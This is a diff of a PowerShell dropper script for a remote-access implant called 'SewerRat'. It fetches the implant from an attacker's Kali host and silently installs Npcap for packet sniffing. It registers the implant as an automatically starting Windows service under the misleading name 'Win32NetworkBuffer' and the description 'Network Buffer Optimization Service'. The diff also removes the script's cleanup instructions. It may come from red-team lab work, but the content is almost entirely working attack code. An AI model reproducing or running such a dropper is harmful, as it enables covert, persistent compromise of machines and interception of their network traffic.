@@ -3,15 +3,46 @@
 # REQUIRES: Administrator Privileges
 # ============================================================================
 
-$KaliIP = "192.168.1.223" # TODO: CHANGE THIS to your Kali IP
-$KaliPort = "80"
+param (
+    [string]$KaliIP = "192.168.1.223", # Change to your Kali IP or pass as -KaliIP "x.x.x.x"
+    [string]$KaliPort = "80"
+)
+
+# Elevate privileges if not running as Admin
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Warning "[-] This script requires Administrator privileges. Please run as Administrator."
+    exit
+}
+
 $ImplantURL = "http://${KaliIP}:${KaliPort}/dist/SewerRat.exe"
 $DestPath = "C:\Windows\System32\drivers\SewerRat.exe"
-# $DeployScript = "http://${KaliIP}:${KaliPort}/scripts/deploy.ps1"
-# $DestPath2 = "C:\Windows\System32\drivers\deploy.ps1"
-$Npcapexe = "http://${KaliIP}:${KaliPort}/npcap-1.87.exe"
-$DestPath3 = "C:\Windows\System32\drivers\npcap-1.87.exe"
+$NpcapexeURL = "http://${KaliIP}:${KaliPort}/npcap-1.87.exe"
+$DestPathNpcap = "C:\Windows\Temp\npcap-1.87.exe"
 $ServiceName = "Win32NetworkBuffer"
+
+Write-Host "[*] Downloading Npcap installer from $NpcapexeURL..."
+try {
+    Invoke-WebRequest -Uri $NpcapexeURL -OutFile $DestPathNpcap -UseBasicParsing
+    Write-Host "[+] Download successful: $DestPathNpcap"
+} catch {
+    Write-Host "[-] Download failed: $_"
+    exit
+}
+
+Write-Host "[*] Installing Npcap silently (Required for Layer 2 Packet Sniffing)..."
+try {
+    $process = Start-Process -FilePath $DestPathNpcap -ArgumentList "/S", "/winpcap_mode=yes", "/admin_only=no" -Wait -PassThru
+    if ($process.ExitCode -eq 0) {
+        Write-Host "[+] Npcap installed successfully."
+    } else {
+        Write-Host "[-] Npcap installation may have encountered an issue (Exit Code: $($process.ExitCode)). Continuing anyway..."
+    }
+} catch {
+    Write-Host "[-] Failed to execute Npcap installer: $_"
+}
+
+Write-Host "[*] Cleaning up Npcap installer..."
+Remove-Item -Path $DestPathNpcap -Force -ErrorAction SilentlyContinue
 
 Write-Host "[*] Downloading SewerRat implant from $ImplantURL..."
 try {
@@ -22,29 +53,12 @@ try {
     exit
 }
 
-# Write-Host "[*] Getting deployment script for SewerRat from $DeployScript..."
-# try {
-#     Invoke-WebRequest -Uri $DeployScript -OutFile $DestPath2 -UseBasicParsing
-#     Write-Host "[+] Download successful: $DestPath2"
-# } catch {
-#     Write-Host "[-] Download failed: $_"
-#     exit
-# }
-Write-Host "[*] Getting Npcap installer from $Npcapexe..."
-try {
-    Invoke-WebRequest -Uri $Npcapexe -OutFile $DestPath3 -UseBasicParsing
-    Write-Host "[+] Download successful: $DestPath3"
-} catch {
-    Write-Host "[-] Download failed: $_"
-    exit
-}
-
-Write-Host "[*] Creating service '$ServiceName'..."
+Write-Host "[*] Creating persistence via service '$ServiceName'..."
 try {
     # If service already exists, stop and delete it first
     if (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) {
         Write-Host "[!] Service already exists. Cleaning up old service..."
-        Stop-Service -Name $ServiceName -Force
+        Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
         sc.exe delete $ServiceName
         Start-Sleep -Seconds 2
     }
@@ -52,8 +66,8 @@ try {
     # Create the service pointing to our downloaded executable
     New-Service -Name $ServiceName `
                 -BinaryPathName $DestPath `
-                -StartupType Manual `
-                -Description "Network Buffer Optimization Service" | Out-Null
+                -StartupType Automatic `
+                -Description "Network Buffer Optimization Service run at startup" | Out-Null
                 
     Write-Host "[+] Service created successfully."
 } catch {
@@ -64,18 +78,9 @@ try {
 Write-Host "[*] Starting service to execute implant..."
 try {
     Start-Service -Name $ServiceName
-    Write-Host "[+] Service started successfully! Implant is now running."
+    Write-Host "[+] Service started successfully! SewerRat is now running."
 } catch {
     Write-Host "[-] Failed to start service: $_"
 }
-```
 
-## 3. Cleanup 
-
-To clean up the environment and remove persistent artifacts after testing, run the following from an administrative session:
-
-```powershell
-Stop-Service -Name "Win32NetworkBuffer" -ErrorAction SilentlyContinue
-sc.exe delete "Win32NetworkBuffer"
-Remove-Item -Path "C:\Windows\System32\drivers\SewerRat.exe" -Force -ErrorAction SilentlyContinue
-Write-Host "[+] Cleanup complete."
+Write-Host "[*] Deployment complete!"
